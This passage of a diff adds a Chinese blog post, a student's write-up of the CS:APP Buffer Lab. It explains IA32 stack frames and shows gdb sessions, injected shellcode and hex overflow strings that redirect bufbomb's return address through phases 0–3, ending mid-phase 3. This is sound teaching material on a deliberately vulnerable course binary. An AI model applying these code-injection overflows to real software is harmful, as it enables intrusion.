@@ -257,6 +257,174 @@
             <div class="postShorten-header">
                 <h1 class="postShorten-title" itemprop="headline">
                     
+                        <a class="link-unstyled" href="/2017/05/16/深入理解计算机系统BufferLab实验报告/">
+                            深入理解计算机系统BufferLab实验报告
+                        </a>
+                    
+                </h1>
+                <div class="postShorten-meta">
+    <time itemprop="datePublished" datetime="2017-05-16T14:28:12+08:00">
+	
+		    5月 16, 2017
+    	
+    </time>
+    
+        <span>发布在 </span>
+        
+    <a class="category-link" href="/categories/计算机系统/">计算机系统</a>
+
+
+    
+</div>
+
+            </div>
+            
+                <div class="postShorten-content" itemprop="articleBody">
+                    <p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/BufferLab" target="_blank" rel="external">Github</a>上</p>
+<blockquote>
+<p>Buffer Lab是《深入理解计算机系统》（第二版）中的缓冲区溢出实验，现在已经被Attack Lab替代。为了熟悉IA32的栈帧以及过程调用的原理，于2017年5月10日将该实验完成。</p>
+</blockquote>
+<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用缓冲区溢出漏洞生成攻击代码去修改一个32位的x86可执行程序的运行时行为。</p>
+<p>该实验加深了对于栈规则的理解以及说明了缓冲区溢出漏洞可能造成的危险后果。</p>
+<p>该实验同Attack Lab非常相似，但是仅仅采用了代码注入攻击作为攻击手段。同时，也要注意x86和x86_64有着不同的栈帧以及过程的调用方式。</p>
+<h3 id="IA32的栈帧以及过程调用"><a href="#IA32的栈帧以及过程调用" class="headerlink" title="IA32的栈帧以及过程调用"></a>IA32的栈帧以及过程调用</h3><h4 id="IA32的栈帧"><a href="#IA32的栈帧" class="headerlink" title="IA32的栈帧"></a>IA32的栈帧</h4><p>IA32的栈帧同x86的栈帧相似，栈从高地址向低地址增长。寄存器%esp保存的是栈帧的栈顶（低地址），寄存器%ebp保存的是栈帧的栈底（高地址）。</p>
+<p>调用者的栈帧主要包括了参数区以及返回地址。</p>
+<p>被调用者的栈帧的栈底首先是保存的寄存器ebp值（指向调用者的栈底），然后是被保存的寄存器，局部变量以及临时空间，最后是参数构造区。</p>
+<h4 id="IA32的过程调用"><a href="#IA32的过程调用" class="headerlink" title="IA32的过程调用"></a>IA32的过程调用</h4><p>IA32提供了如下的过程调用指令：</p>
+<ul>
+<li>call 该指令将返回地址压入调用者的栈帧，并且将程序计数器%eip指向了被调用者的首地址</li>
+<li>leave 该指令一般位于ret指令之前，等价于mov %ebp,%esp和pop %ebp，主要作用是回收栈空间，并且恢复栈顶（%esp）和栈底（%ebp）使得栈帧恢复为调用者栈帧</li>
+<li>ret 该指令从栈中弹出返回地址并且让程序计数器eip指向该地址，使程序继续执行被调用者的下一条指令</li>
+</ul>
+<p>IA32的过程调用遵循如下的规则：</p>
+<ol>
+<li>首先执行call指令，call会在调用者的栈顶压入返回地址并且使程序计数器指向被调用者</li>
+<li>然后保存调用者的栈底即push %ebp，并且将栈顶设置为被调用者的栈底即mov %esp,%ebp</li>
+<li>分配局部的栈空间，主要用于临时变量的存储</li>
+<li>执行被调用者的指令</li>
+<li>执行leave，释放栈空间并重置栈顶（%esp）和栈底（%ebp），使得恢复为调用者栈帧</li>
+<li>执行ret，过程返回并继续执行调用者的指令</li>
+</ol>
+<p>IA32的参数传递规则：<br>同x86不同，IA32不使用寄存器进行参数的传递，IA32从右到左将参数依次压栈，然后调用相应的过程。</p>
+<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>实验讲义中主要包含了以下3个可执行文件：</p>
+<ul>
+<li>bufbomb 你所要攻击的缓冲区炸弹程序</li>
+<li>makecookie 根据你所输入的userid生成一个cookie</li>
+<li>hex2raw 一个生成攻击字符串的工具</li>
+</ul>
+<p>首先我们要输入userid生成一个cookie供后续使用，命令及结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; ./makecookie BlackDragon &gt; cookie                          </div><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat cookie                                              </div><div class="line">0x3dde924c</div></pre></td></tr></table></figure></p>
+<p>然后我们要将bufbomb反汇编以供后续攻击使用，命令及结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; objdump -d bufbomb &gt; bufbomb-disassemble</div></pre></td></tr></table></figure></p>
+<h3 id="目标程序"><a href="#目标程序" class="headerlink" title="目标程序"></a>目标程序</h3><p>目标程序的通过getbuf函数从标准输入流中读取字符串，并且该函数和Attack Lab中的函数一致，且具有缓冲区溢出的漏洞。这里不再赘述。</p>
+<p>值得注意的是，bufbomb函数接受如下的参数：</p>
+<ul>
+<li>-h 打印帮助信息</li>
+<li>-u userid 你应该一直为程序提供该参数，因为远程计分服务器需要该参数，bufbomb也需要该参数去确定你生成的cookie以确定你的攻击满足了条件，并且若干关键的栈地址也和该userid生成的cookie有关</li>
+<li>-n 进入’Nitro’模式，在阶段4中使用</li>
+<li>-s 将你的攻击字符串作为结果提交至计分服务器</li>
+</ul>
+<p>同Attack Lab一样，你需要使用hex2raw从攻击代码生成相应的攻击字符串，这里也不再赘述。</p>
+<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="阶段0：蜡烛（Candle）"><a href="#阶段0：蜡烛（Candle）" class="headerlink" title="阶段0：蜡烛（Candle）"></a>阶段0：蜡烛（Candle）</h3><p>在本实验中，关键函数getbuf被test函数调用，getbuf和test函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* getbuf */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> NORMAL_BUFFER_SIZE ??</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getbuf</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">char</span> buf[NORMAL_BUFFER_SIZE];</div><div class="line">Gets(buf);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* test */</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> val;</div><div class="line"><span class="comment">/* Put canary on stack to detect possible corruption */</span></div><div class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> local = uniqueval();</div><div class="line"></div><div class="line">val = getbuf();</div><div class="line"></div><div class="line"><span class="comment">/* Check for corrupted stack */</span></div><div class="line"><span class="keyword">if</span> (local != uniqueval()) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Sabotaged!: the stack has been corrupted\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (val == cookie) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Boom!: getbuf returned 0x%x\n"</span>, val);</div><div class="line">validate(<span class="number">3</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Dud: getbuf returned 0x%x\n"</span>, val);</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>现在我们希望test函数从getbuf返回时不执行下一条代码，而是跳转至函数smoke，该函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">smoke</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Smoke!: You called smoke()\n"</span>);</div><div class="line">validate(<span class="number">0</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>首先我们需要确定缓冲区的大小，观察bufbomb-disassemble中getbuf的反汇编结果，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">080491f4 &lt;getbuf&gt;:</div><div class="line"> 80491f4:       <span class="number">55</span>                      <span class="keyword">push</span>   %ebp</div><div class="line"> 80491f5:       <span class="number">89</span> e5                   <span class="keyword">mov</span>    %esp,%ebp</div><div class="line"> 80491f7:       <span class="number">83</span> ec <span class="number">38</span>                <span class="keyword">sub</span>    <span class="number">$0</span>x38,%esp</div><div class="line"> 80491fa:       <span class="number">8d</span> <span class="number">45</span> d8                <span class="keyword">lea</span>    -<span class="number">0x28</span>(%ebp),%eax</div><div class="line"> 80491fd:       <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                <span class="keyword">mov</span>    %eax,(%esp)</div><div class="line"> <span class="number">8049200</span>:       e8 f5 fa ff ff          <span class="keyword">call</span>   8048cfa &lt;Gets&gt;</div><div class="line"> <span class="number">8049205</span>:       b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x1,%eax</div><div class="line"> 804920a:       c9                      <span class="keyword">leave</span>  </div><div class="line"> 804920b:       c3                      <span class="keyword">ret</span>   </div></pre></td></tr></table></figure></p>
+<p>注意到函数总共开辟了0x38=56个字节的栈空间，然后lea -0x28(%ebp),%eax mov %eax,(%esp)进行了参数字符串起始地址的构造，考虑到栈从高地址向低地址延伸，而ebp指向栈底，我们可以推测缓冲区总共是0x28=40个字节。</p>
+<p>经过实际测试，可以确定缓冲区确实是40个字节。</p>
+<p>下面我们观察反汇编代码，可以得出函数smoke的起始地址为0x08048c18，根据以上的信息，我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 18 8c 04 08 /* 保存的%ebp以及返回地址 */</div></pre></td></tr></table></figure></p>
+<p>在该阶段中，由于smoke直接使得程序退出，所以我们不需要在意保存的%ebp的值，直接通过缓冲区溢出覆盖返回地址即可。</p>
+<p>下面我们使用hex2raw生成攻击字符串并测试。结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level0.txt|./hex2raw|./bufbomb -u BlackDragon             </div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:Smoke!: You called smoke()</div><div class="line">VALID</div><div class="line">NICE JOB!</div><div class="line">run with level1</div></pre></td></tr></table></figure></p>
+<p>阶段0完成。</p>
+<h3 id="阶段1：火花（Sparkler）"><a href="#阶段1：火花（Sparkler）" class="headerlink" title="阶段1：火花（Sparkler）"></a>阶段1：火花（Sparkler）</h3><p>现在，我们希望getbuf返回时跳转至函数fizz同时能伪装成已经传递了cookie作为参数，该函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">fizz</span><span class="params">(<span class="keyword">int</span> val)</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (val == cookie) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Fizz!: You called fizz(0x%x)\n"</span>, val);</div><div class="line">validate(<span class="number">1</span>);</div><div class="line">&#125; <span class="keyword">else</span></div><div class="line"><span class="built_in">printf</span>(<span class="string">"Misfire: You called fizz(0x%x)\n"</span>, val);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>在该阶段中，我们需要注意IA32中，参数是通过调用者的栈进行传递的，我们观察fizz的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">08048c42 &lt;fizz&gt;:</div><div class="line"> 8048c42:       <span class="number">55</span>                      <span class="keyword">push</span>   %ebp</div><div class="line"> 8048c43:       <span class="number">89</span> e5                   <span class="keyword">mov</span>    %esp,%ebp</div><div class="line"> 8048c45:       <span class="number">83</span> ec <span class="number">18</span>                <span class="keyword">sub</span>    <span class="number">$0</span>x18,%esp</div><div class="line"> 8048c48:       8b <span class="number">45</span> <span class="number">08</span>                <span class="keyword">mov</span>    <span class="number">0x8</span>(%ebp),%eax</div><div class="line"> 8048c4b:       3b <span class="number">05</span> <span class="number">08</span> d1 <span class="number">04</span> <span class="number">08</span>       <span class="keyword">cmp</span>    <span class="number">0x804d108</span>,%eax</div><div class="line"> 8048c51:       <span class="number">75</span> <span class="number">26</span>                   <span class="keyword">jne</span>    8048c79 &lt;fizz+<span class="number">0x37</span>&gt;</div><div class="line"> 8048c53:       <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %eax,<span class="number">0x8</span>(%esp)</div><div class="line"> 8048c57:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> ee a4 <span class="number">04</span>    movl   <span class="number">$0</span>x804a4ee,<span class="number">0x4</span>(%esp)</div><div class="line"> 8048c5e:       <span class="number">08</span></div><div class="line"> 8048c5f:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</div><div class="line"> 8048c66:       e8 <span class="number">55</span> fd ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</div><div class="line"> 8048c6b:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</div><div class="line"> 8048c72:       e8 <span class="number">04</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">call</span>   804937b &lt;validate&gt;</div><div class="line"> 8048c77:       eb <span class="number">18</span>                   <span class="keyword">jmp</span>    8048c91 &lt;fizz+<span class="number">0x4f</span>&gt;</div><div class="line"> 8048c79:       <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %eax,<span class="number">0x8</span>(%esp)</div><div class="line"> 8048c7d:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> <span class="number">40</span> a3 <span class="number">04</span>    movl   <span class="number">$0</span>x804a340,<span class="number">0x4</span>(%esp)</div><div class="line"> 8048c84:       <span class="number">08</span></div><div class="line"> 8048c85:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</div><div class="line"> 8048c8c:       e8 2f fd ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</div><div class="line"> 8048c91:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x0,(%esp)</div><div class="line"> 8048c98:       e8 <span class="number">63</span> fc ff ff          <span class="keyword">call</span>   <span class="number">8048900</span> &lt;exit@plt&gt;</div></pre></td></tr></table></figure></p>
+<p>从上述反汇编代码的第1行第4行和第5行，我们可以知道函数fizz的起始地址为0x08048c42，val保存在0x8(%ebp)中，cookie保存在固定的地址0x804d108中。根据以上的信息，我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 42 8c 04 08 /* 保存的%ebp以及返回地址 */</div><div class="line">00 00 00 00 4c 92 de 3d /* cookie */</div></pre></td></tr></table></figure></p>
+<p>在该攻击代码中，前48个字节同阶段0一样，只是将返回地址改成了了函数fizz的起始地址。而最后8个字节则是用来伪装成传递参数的。注意函数从getbuf返回后并不会真正的调用fizz函数，而只是依次的开始执行fizz的指令。</p>
+<p>因此，从getbuf返回直到获取到参数val这整个过程中，首先getbuf返回会执行复位操作，将栈顶（%esp）指向第40个字节处（从0开始计算，下同），然后将0x0pop至栈底（%ebp），最后根据返回地址跳转至fizz并pop。现在栈顶（%esp）指向了第48个字节。紧接着，直接开始执行fizz的指令，将%ebp（0）入栈，直至执行到mov 0x8(%ebp),%eax，栈顶（%esp）指向第44个字节。所以，我们的cookie应当放在第(44+8=52）个字节处，直到第55个字节为止。</p>
+<p>下面我们使用hex2raw生成攻击字符串并测试，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level1.txt|./hex2raw|./bufbomb -u BlackDragon</div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:Fizz!: You called fizz(0x3dde924c)</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
+<p>阶段1完成。</p>
+<h3 id="阶段2：爆竹（FireCracker）"><a href="#阶段2：爆竹（FireCracker）" class="headerlink" title="阶段2：爆竹（FireCracker）"></a>阶段2：爆竹（FireCracker）</h3><p>bufbomb中包含了一个全局变量global_value以及函数bang，如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> global_value = <span class="number">0</span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> val)</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (global_value == cookie) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Bang!: You set global_value to 0x%x\n"</span>, global_value);</div><div class="line">validate(<span class="number">2</span>);</div><div class="line">&#125; <span class="keyword">else</span></div><div class="line"><span class="built_in">printf</span>(<span class="string">"Misfire: global_value = 0x%x\n"</span>, global_value);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>在该阶段中，我们希望函数能在返回时跳转至bang，但是在这之前，要将全局变量global_value的值设置为cookie。</p>
+<p>该阶段同Attack Lab第1部分的等级2相似，我们需要将程序计数器%eip指向栈，在栈上执行相应的代码，实现相关的修改，最后从栈上返回至函数bang。</p>
+<p>首先我们需要确定在进入getbuf时的栈地址，具体的命令和操作如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; gdb bufbomb                                           </div><div class="line">GNU gdb (GDB) 7.12.1</div><div class="line">Copyright (C) 2017 Free Software Foundation, Inc.</div><div class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class="line">This is free software: you are free to change and redistribute it.</div><div class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">"show copying"</span></div><div class="line">and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</div><div class="line">This GDB was configured as <span class="string">"x86_64-pc-linux-gnu"</span>.</div><div class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</div><div class="line">For bug reporting instructions, please see:</div><div class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</div><div class="line">Find the GDB manual and other documentation resources online at:</div><div class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</div><div class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</div><div class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>...</div><div class="line">Reading symbols from bufbomb...(no debugging symbols found)...<span class="keyword">done</span>.</div><div class="line">(gdb) <span class="built_in">break</span> getbuf</div><div class="line">Breakpoint 1 at 0x80491fa</div><div class="line">(gdb) run -u BlackDragon</div><div class="line">Starting program: /home/user/CSAPPLabs/BufferLab/buflab-handout/bufbomb -u BlackDragon</div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line"></div><div class="line">Breakpoint 1, 0x080491fa <span class="keyword">in</span> getbuf ()</div><div class="line">(gdb) disas</div><div class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> getbuf:</div><div class="line">   0x080491f4 &lt;+0&gt;:	push   %ebp</div><div class="line">   0x080491f5 &lt;+1&gt;:	mov    %esp,%ebp</div><div class="line">   0x080491f7 &lt;+3&gt;:	sub    <span class="variable">$0x38</span>,%esp</div><div class="line">=&gt; 0x080491fa &lt;+6&gt;:	lea    -0x28(%ebp),%eax</div><div class="line">   0x080491fd &lt;+9&gt;:	mov    %eax,(%esp)</div><div class="line">   0x08049200 &lt;+12&gt;:	call   0x8048cfa &lt;Gets&gt;</div><div class="line">   0x08049205 &lt;+17&gt;:	mov    <span class="variable">$0x1</span>,%eax</div><div class="line">   0x0804920a &lt;+22&gt;:	leave  </div><div class="line">   0x0804920b &lt;+23&gt;:	ret    </div><div class="line">End of assembler dump.</div><div class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$esp</span></div><div class="line"><span class="variable">$1</span> = 0x55682f18</div><div class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$ebp</span></div><div class="line"><span class="variable">$2</span> = 0x55682f50</div></pre></td></tr></table></figure></p>
+<p>通过在gdb中添加断点并观察，我们可以确定在执行函数getbuf时，栈底（%ebp）的值为0x55682f50。</p>
+<p>接下来我们要通过gcc和objdump生成攻击代码，具体的操作和Attack Lab相似，我们首先新建一个level2-exploit.s文件，在其中编写相应的攻击代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c, %eax</div><div class="line"><span class="keyword">mov</span> %eax, <span class="number">0x804d100</span> <span class="comment">;设置全局变量</span></div><div class="line"><span class="keyword">add</span> <span class="number">$16</span>, %esp <span class="comment">;修改栈顶</span></div><div class="line"><span class="keyword">ret</span> <span class="comment">;返回</span></div></pre></td></tr></table></figure></p>
+<p>然后我们依次使用<code>gcc -m32 -c level2-exploit.s</code>和<code>objdump -d level2-exploit.o &gt; level2-exploit.d</code>将攻击代码汇编和反汇编，具体的命令和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; gcc -m32 -c level2-exploit.s                          </div><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; objdump -d level2-exploit.o &gt; level2-exploit.d</div><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level2-exploit.d                                    </div><div class="line"></div><div class="line">level2-exploit.o：     文件格式 elf32-i386</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">00000000 &lt;.text&gt;:</div><div class="line">   0:	b8 4c 92 de 3d       	mov    <span class="variable">$0x3dde924c</span>,%eax</div><div class="line">   5:	a3 00 d1 04 08       	mov    %eax,0x804d100</div><div class="line">   a:	83 c4 10             	add    <span class="variable">$0x10</span>,%esp</div><div class="line">   d:	c3                   	ret     </div></pre></td></tr></table></figure>　</p>
+<p>最后我们根据以上的信息来生成我们最终的攻击代码，如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 58 2f 68 55 /* 保存的%ebp以及返回地址(在栈上) */</div><div class="line">b8 4c 92 de 3d a3 00 d1</div><div class="line">04 08 83 c4 10 c3 00 00 /* 攻击代码 */</div><div class="line">9d 8c 04 08　           /* 返回地址指向函数bang */</div></pre></td></tr></table></figure></p>
+<p>下面我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level2.txt|./hex2raw|./bufbomb -u BlackDragon</div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:Bang!: You <span class="built_in">set</span> global_value to 0x3dde924c</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
+<p>阶段2完成。</p>
+<h3 id="阶段3：炸药（Dynamite）"><a href="#阶段3：炸药（Dynamite）" class="headerlink" title="阶段3：炸药（Dynamite）"></a>阶段3：炸药（Dynamite）</h3><p>在前面的几个阶段中，我们所有的攻击都导致程序跳转至其他函数并退出。所以，使用会破坏栈的攻击代码是可行的。</p>
+<p>在该阶段中，你需要修改程序的寄存器和内存状态，并且使程序能正确的返回值原调用者函数并且不出错。这就意味着你必须：</p>
+<ol>
+<li>在栈上执行机器代码</li>
+<li>将返回指针置于代码的起始</li>
+<li>修复对栈造成的破坏</li>
+</ol>
+<p>具体来说，你需要让函数getbuf返回cookie而不是1至函数test。注意到在test中当返回值为cookie时程序会输出”Boom!”。你的攻击代码应当将cookie设置为返回值，恢复任何被破坏的状态，将正确的返回地址push到栈上，最终执行ret指令。</p>
+<p>对于该阶段，我们的思路如下：</p>
+<ol>
+<li>缓冲区溢出的部分要保证保存的%ebp不变以方便后续的寻址过程（攻击代码中使用）。然后和阶段2一样，通过溢出使程序跳转至栈上执行相应的攻击代码</li>
+<li>攻击代码首先将返回地址设置为正确的返回地址（调用者的下一条指令）</li>
+<li>然后再将返回值（%eax）设置为cookie</li>
+<li>最终修改栈顶（%esp）并ret</li>
+</ol>
+<p>缓冲区溢出攻击后，我们期望的整个程序的执行过程如下：</p>
+<ol>
+<li>跳转至栈上执行代码，此时%esp被修改至第48个字节处，且%ebp中存有正确的值。</li>
+<li>程序执行攻击代码，该攻击代码重置了返回地址，覆盖了getbuf的返回值，修改了栈顶指针并ret</li>
